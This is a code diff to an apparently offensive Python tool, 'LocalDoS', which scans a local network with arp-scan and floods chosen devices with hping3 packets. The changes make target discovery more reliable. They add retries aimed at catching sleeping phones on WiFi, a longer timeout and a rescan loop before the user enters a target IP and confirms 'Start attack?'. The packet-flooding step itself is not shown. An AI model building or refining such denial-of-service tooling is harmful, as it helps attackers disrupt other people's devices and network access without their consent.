@@ -6,7 +6,7 @@ Uses arp-scan to discover devices and hping3 to flood them with packets
 import subprocess
 import socket
 import os
-from ui.console import cprint, iprint, wprint, eprint, cinput
+from ui.console import cprint, iprint, wprint, eprint, cinput, CYAN, YELLOW
 
 
 class LocalDoS:
@@ -33,10 +33,13 @@ class LocalDoS:
         try:
             iprint("Scanning local network for connected devices...")
             result = subprocess.run(
-                ["sudo", "arp-scan", "--localnet"],
+                # --retry=3 gives sleepy WiFi devices (e.g. a phone in power-save
+                # with the screen off) extra chances to answer, so they are less
+                # likely to be missed on any single scan.
+                ["sudo", "arp-scan", "--localnet", "--retry=3"],
                 capture_output=True,
                 text=True,
-                timeout=10
+                timeout=15
             )
             
             if result.returncode != 0:
@@ -103,7 +106,7 @@ class LocalDoS:
             return
         
         cprint("\n" + "="*70)
-        cprint("Discovered Devices on Local Network:", "cyan")
+        cprint("Discovered Devices on Local Network:", CYAN)
         cprint("="*70)
         
         for i, device in enumerate(devices, 1):
@@ -180,35 +183,40 @@ class LocalDoS:
     def run_interactive(self):
         """Interactive mode for LocalDoS attack"""
         try:
-            cprint("\n╔════════════════════════════════════╗", "cyan")
-            cprint("║     Local Network DoS Attack        ║", "cyan")
-            cprint("╚════════════════════════════════════╝\n", "cyan")
-            
-            # Discover devices
+            # Discover devices (rescan supported — a phone asleep on WiFi often
+            # misses the first pass and shows up on a second scan)
             devices = self.discover_devices()
-            if not devices:
-                eprint("No devices found on network")
-                return
-            
-            # Display devices
             self.display_devices(devices)
-            
-            # Get target IP from user
+
+            # Get target IP from user (or rescan)
             while True:
-                target_ip = cinput("Enter target IP address")
-                
+                if not devices:
+                    if cinput("No devices found. Rescan? (Y/N)").strip().lower() != 'y':
+                        wprint("Attack cancelled")
+                        return
+                    devices = self.discover_devices()
+                    self.display_devices(devices)
+                    continue
+
+                target_ip = cinput("Enter target IP address (or 'r' to rescan)")
+
+                if target_ip.strip().lower() in ('r', 'rescan'):
+                    devices = self.discover_devices()
+                    self.display_devices(devices)
+                    continue
+
                 if not target_ip.strip():
                     wprint("IP address cannot be empty")
                     continue
-                
+
                 if not self.validate_ip(target_ip):
                     wprint(f"Invalid IP format: {target_ip}")
                     continue
-                
+
                 break
             
             # Confirm target
-            cprint(f"\n[!] Target selected: {target_ip}", "yellow")
+            cprint(f"\n[!] Target selected: {target_ip}", YELLOW)
             confirm = cinput("Start attack? (Y/N)")
             
             if confirm.lower() != 'y':
